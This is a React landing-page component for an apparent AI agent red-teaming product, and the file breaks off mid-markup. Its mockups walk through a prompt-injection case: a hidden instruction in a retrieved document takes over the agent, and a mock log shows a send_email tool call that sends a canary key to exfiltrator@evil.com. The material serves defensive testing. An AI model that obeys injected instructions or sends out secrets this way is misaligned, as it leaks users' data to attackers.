import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Shield,
  Zap,
  Activity,
  Lock,
  ArrowRight,
  Play,
  CheckCircle2,
  Terminal,
  Layers,
  ChevronDown,
  RotateCw,
  Sliders,
  Check,
  Copy,
  AlertTriangle,
  FileCode,
  Flame,
  Search,
  ExternalLink
} from 'lucide-react';

interface LandingPageProps {
  onEnterApp: (tab?: string) => void;
  onLoadDemo: () => void;
  isLoadingDemo: boolean;
}

export const LandingPage: React.FC<LandingPageProps> = ({ onEnterApp, onLoadDemo, isLoadingDemo }) => {
  // Mega menu state
  const [platformMenuOpen, setPlatformMenuOpen] = useState(false);
  const [isScrolled, setIsScrolled] = useState(false);

  // Parallax mouse position for hero cards
  const [mousePos, setMousePos] = useState({ x: 0, y: 0 });

  // Feature 2: Counterfactual toggles interactive state
  const [removedDoc, setRemovedDoc] = useState(false);
  const [isolatedMemory, setIsolatedMemory] = useState(false);
  const [restrictedEmail, setRestrictedEmail] = useState(false);

  // Developer section: Code tab state & copy
  const [codeTab, setCodeTab] = useState<'run' | 'replay' | 'report'>('run');
  const [copied, setCopied] = useState(false);

  // Track scroll for frosted glass navbar
  useEffect(() => {
    const handleScroll = () => {
      if (window.scrollY > 20) {
        setIsScrolled(true);
      } else {
        setIsScrolled(false);
      }
    };
    window.addEventListener('scroll', handleScroll);
    return () => window.removeEventListener('scroll', handleScroll);
  }, []);

  const handleMouseMove = (e: React.MouseEvent<HTMLDivElement>) => {
    const { clientX, clientY, currentTarget } = e;
    const { width, height, left, top } = currentTarget.getBoundingClientRect();
    const x = ((clientX - left) / width - 0.5) * 2;
    const y = ((clientY - top) / height - 0.5) * 2;
    setMousePos({ x, y });
  };

  const handleCopyCode = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const codeSnippets = {
    run: `// 1. Launch automated red-team campaign against agent
POST /api/campaigns
Content-Type: application/json

{
  "target": "acme-corp-assistant",
  "goals": ["extract_canary_api_key", "dump_customer_pii"],
  "budget_per_goal": 10,
  "defenses": ["policy_engine", "delimiting"]
}

// Response: 201 Created
{
  "campaign_id": "camp_8921b4e7",
  "status": "completed",
  "exploit_success_rate": 0.10,
  "takeover_step": 3,
  "violated_policy": "canary_leak",
  "ci_passed": true
}`,
    replay: `// 2. Replay high-confidence attack 10x with Wilson Score CI
POST /api/attacks/atk_demo_004/replay
Content-Type: application/json

{
  "n_runs": 10,
  "defense_ids": ["policy_engine", "hierarchy_prompt"]
}

// Response: Statistical Replay Matrix
{
  "attack_id": "atk_demo_004",
  "runs": 10,
  "breaches": 0,
  "empirical_asr": 0.00,
  "wilson_ci": [0.000, 0.038],
  "mitigation_verified": true
}`,
    report: `// 3. Fetch comprehensive executive compliance report
GET /api/reports/camp_8921b4e7?format=json

// Response: Vanta & Drata Ready Security Audit
{
  "campaign_id": "camp_8921b4e7",
  "trust_score": 98.4,
  "status": "APPROVED_FOR_PRODUCTION",
  "tested_vulnerabilities": {
    "prompt_injection": "RESISTED",
    "indirect_injection": "RESISTED",
    "tool_privilege_abuse": "RESISTED",
    "memory_poisoning": "RESISTED"
  }
}`
  };

  return (
    <div className="w-full min-h-screen bg-[#FFFAED] text-[#132E4F] font-body selection:bg-[#275992] selection:text-[#FFFAED] relative overflow-x-hidden">

      {/* =========================================================================
          SECTION 1: ANNOUNCEMENT BAR
          ========================================================================= */}
      <aside aria-label="Announcement" className="w-full bg-[#F5EEDB] border-b border-[#95A1D8]/25 py-2 px-4 relative z-50">
        <div className="max-w-[1200px] mx-auto flex items-center justify-center">
          <button
            onClick={() => {
              const el = document.getElementById('feature-explain');
              el?.scrollIntoView({ behavior: 'smooth' });
            }}
            className="group inline-flex items-center gap-2 text-xs sm:text-sm font-medium text-[#275992] hover:text-[#132E4F] transition-colors"
          >
            <span className="px-2 py-0.5 rounded-full bg-[#275992]/10 text-[11px] font-semibold tracking-wide uppercase text-[#275992]">
              New
            </span>
            <span>Counterfactual tracing finds the exact step that broke your agent</span>
            <ArrowRight className="w-3.5 h-3.5 group-hover:translate-x-1 transition-transform" />
          </button>
        </div>
      </aside>

      {/* =========================================================================
          SECTION 2: STICKY NAVIGATION WITH MEGA-MENU
          ========================================================================= */}
      <header
        className={`sticky top-0 z-40 transition-all duration-300 ${
          isScrolled
            ? 'bg-[#FFFAED]/85 backdrop-blur-md border-b border-[#95A1D8]/20 shadow-[0_4px_20px_rgba(149,161,216,0.12)]'
            : 'bg-transparent border-b border-transparent'
        }`}
      >
        <div className="max-w-[1240px] mx-auto px-4 sm:px-6 h-20 flex items-center justify-between">
          
          {/* Brand Wordmark & Shield Node Icon */}
          <div
            onClick={() => onEnterApp('home')}
            className="flex items-center gap-3 cursor-pointer select-none group"
          >
            <div className="w-9 h-9 rounded-xl bg-[#275992] flex items-center justify-center text-[#FFFAED] shadow-[0_4px_12px_rgba(39,89,146,0.25)] group-hover:bg-[#1E4775] transition-colors">
              <Shield className="w-5 h-5 text-[#FFFAED]" />
            </div>
            <div className="flex flex-col">
              <span className="text-xl font-bold tracking-tight text-[#132E4F] group-hover:text-[#275992] transition-colors">
                AgentBreak
              </span>
              <span className="text-[10px] uppercase font-bold tracking-[0.2em] text-[#95A1D8] -mt-1">
                Autonomous Red Team
              </span>
            </div>
          </div>

          {/* Desktop Nav Links */}
          <nav className="hidden md:flex items-center gap-1 relative">
            
            {/* Platform Dropdown Mega Menu */}
            <div
              className="relative"
              onMouseEnter={() => setPlatformMenuOpen(true)}
              onMouseLeave={() => setPlatformMenuOpen(false)}
            >
              <button className="flex items-center gap-1.5 px-4 py-2 rounded-full text-sm font-medium text-[#132E4F]/80 hover:text-[#275992] hover:bg-[#95A1D8]/10 transition-colors">
                <span>Platform</span>
                <ChevronDown className={`w-3.5 h-3.5 transition-transform duration-200 ${platformMenuOpen ? 'rotate-180' : ''}`} />
              </button>

              <AnimatePresence>
                {platformMenuOpen && (
                  <motion.div
                    initial={{ opacity: 0, y: 10, scale: 0.98 }}
                    animate={{ opacity: 1, y: 0, scale: 1 }}
                    exit={{ opacity: 0, y: 8, scale: 0.98 }}
                    transition={{ duration: 0.18, ease: 'easeOut' }}
                    className="absolute top-full left-0 w-80 p-3 mt-1.5 rounded-2xl bg-[#FFFDF8]/95 backdrop-blur-xl border border-[#95A1D8]/30 shadow-[0_20px_45px_rgba(149,161,216,0.3)] z-50 space-y-1"
                  >
                    {[
                      {
                        title: 'Attack Engine',
                        desc: 'Adaptive multi-turn mutations in isolated sandbox',
                        icon: Flame,
                        color: 'text-[#E06D53]',
                        bg: 'bg-[#E06D53]/10',
                        tab: 'runner'
                      },
                      {
                        title: 'Counterfactual Tracing',
                        desc: 'Pinpoint exact takeover step & memory poisoning',
                        icon: Activity,
                        color: 'text-[#275992]',
                        bg: 'bg-[#275992]/10',
                        tab: 'findings'
                      },
                      {
                        title: 'Defense Matrix',
                        desc: 'Empirical security vs. utility trade-off curves',
                        icon: Layers,
                        color: 'text-[#528A74]',
                        bg: 'bg-[#528A74]/10',
                        tab: 'defenses'
                      },
                      {
                        title: 'Deterministic Oracles',
                        desc: 'Cryptographic canaries with zero false positives',
                        icon: Shield,
                        color: 'text-[#95A1D8]',
                        bg: 'bg-[#95A1D8]/15',
                        tab: 'dashboard'
                      },
                    ].map((item, idx) => (
                      <div
                        key={idx}
                        onClick={() => {
                          setPlatformMenuOpen(false);
                          onEnterApp(item.tab);
                        }}
                        className="p-2.5 rounded-xl hover:bg-[#F5EEDB] transition-colors cursor-pointer flex items-start gap-3 group"
                      >
                        <div className={`p-2 rounded-lg ${item.bg} ${item.color} mt-0.5 shrink-0`}>
                          <item.icon className="w-4 h-4" />
                        </div>
                        <div>
                          <div className="text-xs font-semibold text-[#132E4F] group-hover:text-[#275992] transition-colors">
                            {item.title}
                          </div>
                          <div className="text-[11px] text-[#586D85] leading-tight mt-0.5">
                            {item.desc}
                          </div>
                        </div>
                      </div>
                    ))}
                  </motion.div>
                )}
              </AnimatePresence>
            </div>

            <button
              onClick={() => {
                const el = document.getElementById('feature-find');
                el?.scrollIntoView({ behavior: 'smooth' });
              }}
              className="px-4 py-2 rounded-full text-sm font-medium text-[#132E4F]/80 hover:text-[#275992] hover:bg-[#95A1D8]/10 transition-colors"
            >
              How it works
            </button>
            <button
              onClick={() => onEnterApp('defenses')}
              className="px-4 py-2 rounded-full text-sm font-medium text-[#132E4F]/80 hover:text-[#275992] hover:bg-[#95A1D8]/10 transition-colors"
            >
              Defenses
            </button>
            <button
              onClick={() => {
                const el = document.getElementById('developer-section');
                el?.scrollIntoView({ behavior: 'smooth' });
              }}
              className="px-4 py-2 rounded-full text-sm font-medium text-[#132E4F]/80 hover:text-[#275992] hover:bg-[#95A1D8]/10 transition-colors"
            >
              Docs & API
            </button>
            <button
              onClick={() => onEnterApp('report')}
              className="px-4 py-2 rounded-full text-sm font-medium text-[#132E4F]/80 hover:text-[#275992] hover:bg-[#95A1D8]/10 transition-colors"
            >
              Executive Report
            </button>
          </nav>

          {/* Right Action Buttons */}
          <div className="flex items-center gap-3">
            <button
              onClick={onLoadDemo}
              disabled={isLoadingDemo}
              className="hidden sm:inline-flex items-center gap-1.5 px-4 py-2 rounded-full text-xs font-semibold text-[#275992] hover:text-[#132E4F] hover:bg-[#95A1D8]/15 transition-all disabled:opacity-50"
            >
              <RotateCw className={`w-3.5 h-3.5 ${isLoadingDemo ? 'animate-spin' : ''}`} />
              <span>{isLoadingDemo ? 'Loading Demo...' : 'Load Sample Data'}</span>
            </button>

            <button
              onClick={() => onEnterApp('dashboard')}
              className="text-xs sm:text-sm font-semibold text-[#132E4F]/80 hover:text-[#275992] px-2 py-2 transition-colors"
            >
              Sign in
            </button>

            <button
              onClick={() => onEnterApp('runner')}
              className="group relative px-5 py-2.5 bg-[#275992] text-[#FFFAED] rounded-full text-xs sm:text-sm font-semibold hover:bg-[#1E4775] transition-all shadow-[0_4px_16px_rgba(39,89,146,0.3)] hover:shadow-[0_6px_22px_rgba(39,89,146,0.45)] flex items-center gap-2"
            >
              <span>Launch campaign</span>
              <ArrowRight className="w-3.5 h-3.5 group-hover:translate-x-0.5 transition-transform" />
            </button>
          </div>
        </div>
      </header>

      {/* =========================================================================
          SECTION 3: HERO WITH ANIMATED GRADIENT MESH & 3D FLOATING CARDS
          ========================================================================= */}
      <section
        onMouseMove={handleMouseMove}
        className="relative pt-12 pb-24 md:pt-20 md:pb-36 px-4 sm:px-6 max-w-[1240px] mx-auto min-h-[85vh] flex flex-col justify-center"
      >
        {/* Soft Animated Background Gradient Mesh */}
        <div className="absolute inset-0 -z-10 overflow-hidden pointer-events-none">
          <div className="absolute -top-[10%] -left-[15%] w-[65%] h-[75%] rounded-full bg-gradient-to-br from-[#95A1D8]/35 via-[#FFFAED] to-transparent blur-[120px] animate-mesh-drift" />
          <div className="absolute top-[20%] right-[-10%] w-[55%] h-[70%] rounded-full bg-gradient-to-bl from-[#275992]/20 via-[#95A1D8]/30 to-[#FFFAED] blur-[140px] animate-mesh-wave" />
          <div className="absolute -bottom-[20%] left-[25%] w-[50%] h-[50%] rounded-full bg-[#F5EEDB] blur-[90px]" />
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-12 lg:gap-8 items-center">
          
          {/* Hero Left Column */}
          <div className="lg:col-span-6 space-y-6 lg:pr-4">
            
            {/* Small Uppercase Eyebrow Label */}
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-[#FFFDF8] border border-[#95A1D8]/30 shadow-sm">
              <span className="w-2 h-2 rounded-full bg-[#275992] animate-pulse"></span>
              <span className="text-[11px] font-bold tracking-widest uppercase text-[#275992]">
                AUTONOMOUS AI RED TEAM
              </span>
            </div>

            {/* Huge Headline (72-88px Desktop) */}
            <h1 className="text-5xl sm:text-6xl lg:text-[76px] font-extrabold text-[#132E4F] tracking-tight leading-[1.04]">
              Break your agent <br />
              <span className="bg-gradient-to-r from-[#275992] via-[#1E4775] to-[#95A1D8] bg-clip-text text-transparent">
                before attackers do.
              </span>
            </h1>

            {/* Two-Line Subheadline */}
            <p className="text-lg sm:text-xl text-[#586D85] leading-relaxed max-w-xl font-normal">
              Autonomous red-teaming that simulates real multi-turn exploits in an isolated sandbox, explains the exact failure point, and mathematically proves your defenses.
            </p>

            {/* Two Action Buttons */}
            <div className="flex flex-col sm:flex-row items-stretch sm:items-center gap-4 pt-2">
              <button
                onClick={() => onEnterApp('runner')}
                className="group px-7 py-3.5 bg-[#275992] text-[#FFFAED] rounded-full text-base font-semibold hover:bg-[#1E4775] transition-all shadow-[0_6px_20px_rgba(39,89,146,0.35)] hover:shadow-[0_8px_28px_rgba(39,89,146,0.5)] flex items-center justify-center gap-2"
              >
                <span>Launch campaign</span>
                <ArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
              </button>

              <button
                onClick={onLoadDemo}
                className="px-6 py-3.5 bg-[#FFFDF8] border border-[#275992]/40 text-[#275992] rounded-full text-base font-semibold hover:bg-[#F5EEDB] hover:border-[#275992] transition-colors flex items-center justify-center gap-2 shadow-sm"
              >
                <Play className="w-4 h-4 fill-[#275992]" />
                <span>Watch demo trace</span>
              </button>
            </div>

            {/* Safety subline */}
            <div className="flex items-center gap-2 text-xs text-[#586D85] font-medium pt-1">
              <span className="w-1.5 h-1.5 rounded-full bg-[#528A74]" />
              <span>Sandboxed. Reproducible. Built for agent developers.</span>
            </div>
          </div>

          {/* Hero Right Column: 3D Floating Layered Glass Cards with Parallax */}
          <div className="lg:col-span-6 relative min-h-[460px] flex items-center justify-center perspective-[1200px]">
            
            {/* Card (a): Mini Attack Graph with Glowing Malicious Path */}
            <motion.div
              animate={{
                x: mousePos.x * -14,
                y: mousePos.y * -14,
              }}
              transition={{ type: 'spring', damping: 25, stiffness: 120 }}
              className="animate-float-1 stripe-glass-card rounded-2xl p-5 w-full max-w-sm sm:max-w-md absolute z-10 -top-6 sm:top-2 -left-2 sm:left-4"
            >
              <div className="flex items-center justify-between pb-3 mb-3 border-b border-[#95A1D8]/20">
                <div className="flex items-center gap-2">
                  <div className="w-2.5 h-2.5 rounded-full bg-[#E06D53] animate-ping" />
                  <span className="text-xs font-bold uppercase tracking-wider text-[#132E4F]">
                    Attack Path Trace #004
                  </span>
                </div>
                <span className="px-2 py-0.5 rounded-md text-[10px] font-mono font-bold bg-[#E06D53]/15 text-[#E06D53] border border-[#E06D53]/30">
                  EXPLOIT ACTIVE
                </span>
              </div>

              {/* Node graph flow */}
              <div className="space-y-2.5 text-xs font-mono">
                <div className="p-2.5 rounded-xl bg-[#FFFDF8] border border-[#95A1D8]/25 flex items-center justify-between shadow-xs">
                  <div className="flex items-center gap-2">
                    <span className="text-[#275992] font-bold">1. USER</span>
                    <span className="text-[#586D85] truncate max-w-[170px]">"Summarize internal IT policy"</span>
                  </div>
                  <CheckCircle2 className="w-3.5 h-3.5 text-[#528A74]" />
                </div>

                <div className="p-2.5 rounded-xl bg-[#FFFDF8] border border-[#95A1D8]/25 flex items-center justify-between shadow-xs">
                  <div className="flex items-center gap-2">
                    <span className="text-[#275992] font-bold">2. TOOL</span>
                    <span className="text-[#586D85]">search_docs("it_policy")</span>
                  </div>
                  <CheckCircle2 className="w-3.5 h-3.5 text-[#528A74]" />
                </div>

                {/* Compromised Step with Coral Glow */}
                <div className="p-2.5 rounded-xl bg-[#FDEEEA] border-2 border-[#E06D53] flex items-center justify-between animate-coral-pulse">
                  <div className="flex items-center gap-2">
                    <span className="text-[#E06D53] font-bold">3. INJECTION</span>
                    <span className="text-[#E06D53] font-semibold truncate max-w-[170px]">
                      doc_04: canary_harvest payload
                    </span>
                  </div>
                  <AlertTriangle className="w-4 h-4 text-[#E06D53]" />
                </div>

                <div className="p-2 rounded-lg bg-[#FFFAED] text-[10px] text-[#586D85] flex items-center justify-between">
                  <span>CANARY LEAK DETECTED</span>
                  <span className="font-bold text-[#E06D53]">CANARY-KEY-8f3a</span>
                </div>
              </div>
            </motion.div>

            {/* Card (b): "Takeover Point" Card pointing at step */}
            <motion.div
              animate={{
                x: mousePos.x * 20,
                y: mousePos.y * 20,
              }}
              transition={{ type: 'spring', damping: 20, stiffness: 100 }}
              className="animate-float-2 stripe-glass-card rounded-2xl p-4 w-64 absolute z-30 right-0 sm:right-2 top-36 sm:top-44 shadow-[0_20px_45px_rgba(149,161,216,0.35)]"
            >
              <div className="flex items-start gap-2.5">
                <div className="w-7 h-7 rounded-lg bg-[#E06D53]/15 text-[#E06D53] flex items-center justify-center shrink-0 mt-0.5">
                  <AlertTriangle className="w-4 h-4" />
                </div>
                <div>
                  <div className="text-[11px] font-bold uppercase tracking-wider text-[#E06D53]">
                    Takeover Point Found
                  </div>
                  <div className="text-xs font-semibold text-[#132E4F] mt-0.5">
                    Step #3: Untrusted Doc
                  </div>
                  <p className="text-[11px] text-[#586D85] mt-1 leading-tight">
                    Instruction smuggling overrode the system prompt authority.
                  </p>
                </div>
              </div>
            </motion.div>

            {/* Card (c): "Exploit blocked, replay 0/10" in Soft Sage */}
            <motion.div
              animate={{
                x: mousePos.x * -10,
                y: mousePos.y * -10,
              }}
              transition={{ type: 'spring', damping: 25, stiffness: 140 }}
              className="animate-float-3 stripe-glass-card rounded-2xl p-4 w-72 absolute z-20 -bottom-8 sm:bottom-0 left-6 sm:left-12 border-2 border-[#528A74]/40"
            >
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 rounded-full bg-[#EEF6F3] text-[#528A74] flex items-center justify-center shrink-0 border border-[#528A74]/30">
                  <CheckCircle2 className="w-5 h-5 text-[#528A74]" />
                </div>
                <div>
                  <div className="text-xs font-bold text-[#528A74]">
                    Exploit Blocked (Replay 0/10)
                  </div>
                  <div className="text-[11px] text-[#586D85] font-mono mt-0.5">
                    Wilson 95% CI: [0.00, 0.038]
                  </div>
                </div>
              </div>
              <div className="mt-2.5 pt-2 border-t border-[#95A1D8]/20 flex items-center justify-between text-[10px] text-[#132E4F]/70">
                <span>Mitigation: Policy Engine</span>
                <span className="font-semibold text-[#528A74]">PASS</span>
              </div>
            </motion.div>

          </div>

        </div>
      </section>

      {/* =========================================================================
          SECTION 4: TRUST STRIP
          ========================================================================= */}
      <section className="py-14 border-y border-[#95A1D8]/20 bg-[#F5EEDB]/60">
        <div className="max-w-[1200px] mx-auto px-4 sm:px-6">
          <p className="text-center text-xs font-bold uppercase tracking-[0.2em] text-[#275992] mb-8">
            Built for teams shipping autonomous agents
          </p>

          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-5 gap-8 items-center justify-items-center opacity-85">
            {[
              { name: 'SYNAPSE AI', symbol: '◈' },
              { name: 'COGNITIVE CORE', symbol: '◎' },
              { name: 'NEXUS AGENTS', symbol: '◇' },
              { name: 'VERITAS LABS', symbol: '◬' },
              { name: 'HYPERION SYSTEM', symbol: '◉' },
            ].map((brand, i) => (
              <div
                key={i}
                className="flex items-center gap-2 text-sm sm:text-base font-bold tracking-wider text-[#275992]/80 hover:text-[#132E4F] transition-colors cursor-default"
              >
                <span className="text-lg text-[#95A1D8]">{brand.symbol}</span>
                <span>{brand.name}</span>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* =========================================================================
          SECTION 5: FEATURE 1 - "FIND" (ATTACKS THAT ADAPT)
          ========================================================================= */}
      <section id="feature-find" className="py-24 sm:py-32 px-4 sm:px-6 max-w-[1240px] mx-auto">
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-12 lg:gap-16 items-center">
          
          {/* Left Text Column */}
          <div className="lg:col-span-5 space-y-5">
            <span className="text-xs font-bold uppercase tracking-[0.2em] text-[#275992]">
              ADAPTIVE EXPLORATION
            </span>
            <h2 className="text-4xl sm:text-5xl font-extrabold text-[#132E4F] tracking-tight leading-[1.1]">
              Attacks that adapt.
            </h2>
            <p className="text-base sm:text-lg text-[#586D85] leading-relaxed">
              Traditional red teams run static prompt benchmarks that real-world attackers bypass in minutes. AgentBreak uses evolutionary mutators to probe multi-turn agent logic, escalating privilege through indirect injections, memory poisoning, and tool abuse until it finds an exploit.
            </p>
            <div className="pt-2">
              <button
                onClick={() => onEnterApp('runner')}
                className="group inline-flex items-center gap-2 text-base font-bold text-[#275992] hover:text-[#1E4775] transition-colors"
              >
                <span>Launch dynamic attack runner</span>
                <ArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
              </button>
            </div>
          </div>

          {/* Right Glass UI Mockup: Attack Graph Canvas */}
          <div className="lg:col-span-7 stripe-glass-card rounded-3xl p-6 sm:p-8 shadow-[0_25px_60px_rgba(149,161,216,0.25)] border border-white">
            
            {/* Top Toolbar */}
            <div className="flex flex-wrap items-center justify-between gap-3 pb-5 mb-6 border-b border-[#95A1D8]/20">
              <div className="flex items-center gap-2.5">
                <div className="w-3 h-3 rounded-full bg-[#E06D53]" />
                <span className="font-mono text-xs font-bold text-[#132E4F]">
                  Target: acme_assistant_sandbox
                </span>
              </div>
              <div className="flex items-center gap-2">
                <span className="px-2.5 py-1 rounded-full bg-[#95A1D8]/20 text-[#275992] text-xs font-bold font-mono">
                  Iteration #4 / 10
                </span>
                <span className="px-2.5 py-1 rounded-full bg-[#528A74]/15 text-[#528A74] text-xs font-bold font-mono">
                  Sandbox Active
                </span>
              </div>
            </div>

            {/* Attack Graph Canvas with SVG Dash Connectors */}
            <div className="relative py-4">
              <svg className="absolute inset-0 w-full h-full pointer-events-none stroke-[#95A1D8]/60" style={{ zIndex: 0 }}>
                <line x1="20%" y1="25%" x2="50%" y2="25%" strokeWidth="2" className="animate-dash-flow" />
                <line x1="50%" y1="25%" x2="80%" y2="25%" strokeWidth="2" className="animate-dash-flow" />
                <line x1="80%" y1="25%" x2="80%" y2="75%" strokeWidth="2" className="animate-dash-flow" />
                <line x1="80%" y1="75%" x2="50%" y2="75%" strokeWidth="2" className="stroke-[#E06D53] stroke-2 animate-dash-flow" />
              </svg>

              <div className="relative z-10 grid grid-cols-3 gap-4 mb-6 text-xs font-mono">
                <div className="p-3 rounded-2xl bg-[#FFFDF8] border border-[#95A1D8]/30 shadow-sm text-center">
                  <div className="text-[10px] text-[#586D85] uppercase">Vector</div>
                  <div className="font-bold text-[#275992] mt-0.5">Prompt Injection</div>
                </div>
                <div className="p-3 rounded-2xl bg-[#FFFDF8] border border-[#95A1D8]/30 shadow-sm text-center">
                  <div className="text-[10px] text-[#586D85] uppercase">Mutation</div>
                  <div className="font-bold text-[#132E4F] mt-0.5">Context Switch</div>
                </div>
                <div className="p-3 rounded-2xl bg-[#FDEEEA] border border-[#E06D53]/40 shadow-sm text-center">
                  <div className="text-[10px] text-[#E06D53] uppercase font-bold">Partial Score</div>
                  <div className="font-bold text-[#E06D53] text-sm mt-0.5">1.00 (Breached)</div>
                </div>
              </div>

              {/* Step Execution Log */}
              <div className="p-4 rounded-2xl bg-[#FFFDF8]/90 border border-[#95A1D8]/20 font-mono text-[11px] leading-relaxed space-y-1.5 shadow-inner">
                <div className="text-[#586D85] flex items-center justify-between">
                  <span>[MUTATOR] Synthesizing urgency_escalation strategy</span>
                  <span className="text-[10px]">T+120ms</span>
                </div>
                <div className="text-[#275992]">
                  [TOOL] send_email(to="exfiltrator@evil.com", body="CANARY-KEY-8f3a...")
                </div>
                <div className="text-[#E06D53] font-bold">
                  [ORACLE] VIOLATION: canary_leak confirmed against system policy.
                </div>
              </div>
            </div>
          </div>

        </div>
      </section>

      {/* =========================================================================
          SECTION 6: FEATURE 2 - "EXPLAIN" (COUNTERFACTUAL TRACING - MIRRORED)
          ========================================================================= */}
      <section id="feature-explain" className="py-24 sm:py-32 px-4 sm:px-6 max-w-[1240px] mx-auto bg-[#F5EEDB]/40 rounded-3xl my-8">
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-12 lg:gap-16 items-center">
          
          {/* Left Mockup: Counterfactual Tracing Panel with Interactive Toggles */}
          <div className="lg:col-span-7 order-2 lg:order-1 stripe-glass-card rounded-3xl p-6 sm:p-8 shadow-[0_25px_60px_rgba(149,161,216,0.25)] border border-white">
            
            <div className="flex items-center justify-between pb-4 mb-5 border-b border-[#95A1D8]/20">
              <div className="flex items-center gap-2">
                <Sliders className="w-4 h-4 text-[#275992]" />
                <span className="font-bold text-sm text-[#132E4F]">
                  Counterfactual Intervention Sandbox
                </span>
              </div>
              <span className="text-xs font-mono text-[#586D85]">
                Trace #atk-demo-004
              </span>
            </div>

            {/* Interactive Step Intervention Toggles */}
            <div className="space-y-3 font-mono text-xs">
              
              {/* Step 1 */}
              <div className="p-3 rounded-2xl bg-[#FFFDF8] border border-[#95A1D8]/30 flex items-center justify-between shadow-xs">
                <div>
                  <span className="text-[#275992] font-bold">Step #1:</span>
                  <span className="text-[#132E4F] ml-2">User prompt submitted</span>
                </div>
                <span className="text-[10px] text-[#528A74] font-bold uppercase">Benign</span>
              </div>

              {/* Step 2: Poisoned Document (Interactive Toggle) */}
              <div className={`p-3 rounded-2xl transition-all border ${
                removedDoc
                  ? 'bg-[#EEF6F3] border-[#528A74]'
                  : 'bg-[#FDEEEA] border-[#E06D53] shadow-md'
              }`}>
                <div className="flex items-center justify-between">
                  <div>
                    <span className={removedDoc ? 'text-[#528A74] font-bold' : 'text-[#E06D53] font-bold'}>
                      Step #2:
                    </span>
                    <span className="ml-2 font-medium">
                      Retrieved External Document #03
                    </span>
                  </div>
                  <button
                    onClick={() => setRemovedDoc(!removedDoc)}
                    className={`px-3 py-1 rounded-full text-xs font-bold transition-all ${
                      removedDoc
                        ? 'bg-[#528A74] text-white shadow-xs'
                        : 'bg-[#E06D53] text-white hover:bg-[#c95840]'
                    }`}
                  >
                    {removedDoc ? '✓ Neutralized' : 'Remove Doc'}
                  </button>
                </div>
                {!removedDoc && (
                  <div className="mt-2 text-[11px] text-[#E06D53] font-sans font-semibold flex items-center gap-1.5">
                    <AlertTriangle className="w-3.5 h-3.5" />
                    <span>Takeover point: Hidden instruction hijacking prompt detected here.</span>
                  </div>
                )}
              </div>

              {/* Step 3: Tool Execution */}
              <div className="p-3 rounded-2xl bg-[#FFFDF8] border border-[#95A1D8]/30 flex items-center justify-between shadow-xs">
                <div>
                  <span className="text-[#275992] font-bold">Step #3:</span>
                  <span className="text-[#132E4F] ml-2">Tool Call: send_email()</span>
                </div>
                <button
                  onClick={() => setRestrictedEmail(!restrictedEmail)}
                  className={`px-2.5 py-0.5 rounded-full text-[11px] font-bold transition-all ${
                    restrictedEmail
                      ? 'bg-[#528A74] text-white'
                      : 'bg-[#95A1D8]/20 text-[#275992] hover:bg-[#95A1D8]/35'
                  }`}
                >
                  {restrictedEmail ? 'Domain Restricted' : 'Toggle Allowlist'}
                </button>
              </div>

            </div>

            {/* Live Counterfactual Simulation Result Banner */}
            <div className={`mt-5 p-4 rounded-2xl border transition-all ${
              removedDoc || restrictedEmail
                ? 'bg-[#EEF6F3] border-[#528A74] text-[#528A74]'
                : 'bg-[#FDEEEA] border-[#E06D53] text-[#E06D53]'
            }`}>
              <div className="flex items-center justify-between font-bold text-xs">
                <span className="flex items-center gap-2">
                  <span className="w-2 h-2 rounded-full bg-current animate-pulse" />
                  Counterfactual Replay Verdict:
                </span>
                <span className="uppercase tracking-wider px-2.5 py-0.5 rounded-full bg-white/70">
                  {removedDoc || restrictedEmail ? 'ATTACK STOPS (SAFE)' : 'ATTACK STILL SUCCEEDS'}
                </span>
              </div>
              <p className="text-[11px] mt-1.5 text-[#132E4F]/80 leading-relaxed font-sans">
                {removedDoc
                  ? 'Isolating Document #03 prevented prompt injection transfer entirely with 0 benign utility loss.'
                  : 'Without document isolation or domain filtering, the attack breaches memory and exfiltrates canaries.'}
              </p>
            </div>

          </div>

          {/* Right Text Column */}
          <div className="lg:col-span-5 order-1 lg:order-2 space-y-5">
            <span className="text-xs font-bold uppercase tracking-[0.2em] text-[#275992]">
              COUNTERFACTUAL CAUSALITY
            </span>
            <h2 className="text-4xl sm:text-5xl font-extrabold text-[#132E4F] tracking-tight leading-[1.1]">
              See exactly which step broke it.
            </h2>
            <p className="text-base sm:text-lg text-[#586D85] leading-relaxed">
              Never guess why an LLM hallucinated secrets or executed malicious tools. Our deterministic counterfactual engine re-runs isolated slices of the trace, neutralizing individual tokens, documents, or memory slots to identify the precise moment control was surrendered.
            </p>
            <div className="pt-2">
              <button
                onClick={() => onEnterApp('findings')}
                className="group inline-flex items-center gap-2 text-base font-bold text-[#275992] hover:text-[#1E4775] transition-colors"
              >
                <span>Inspect forensic traces</span>
                <ArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
              </button>
            </div>
          </div>

        </div>
      </section>

      {/* =========================================================================
          SECTION 7: FEATURE 3 - "FIX AND VERIFY" (HEATMAP & SCATTER CHART)
          ========================================================================= */}
      <section className="py-24 sm:py-32 px-4 sm:px-6 max-w-[1240px] mx-auto">
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-12 lg:gap-16 items-center">
          
          {/* Left Text Column */}
          <div className="lg:col-span-5 space-y-5">
            <span className="text-xs font-bold uppercase tracking-[0.2em] text-[#275992]">
              SECURITY VS. UTILITY
            </span>
            <h2 className="text-4xl sm:text-5xl font-extrabold text-[#132E4F] tracking-tight leading-[1.1]">
              Prove the fix works without breaking the agent.
            </h2>
            <p className="text-base sm:text-lg text-[#586D85] leading-relaxed">
              Over-defending turns your helpful assistant into an unusable brick. AgentBreak evaluates defensive interventions against both adversarial exploits and benign benchmark tasks, plotting the Pareto frontier so you ship safe agents that actually work.
            </p>
            <div className="pt-2">
              <button
                onClick={() => onEnterApp('defenses')}
                className="group inline-flex items-center gap-2 text-base font-bold text-[#275992] hover:text-[#1E4775] transition-colors"
              >
                <span>Explore defense matrix</span>
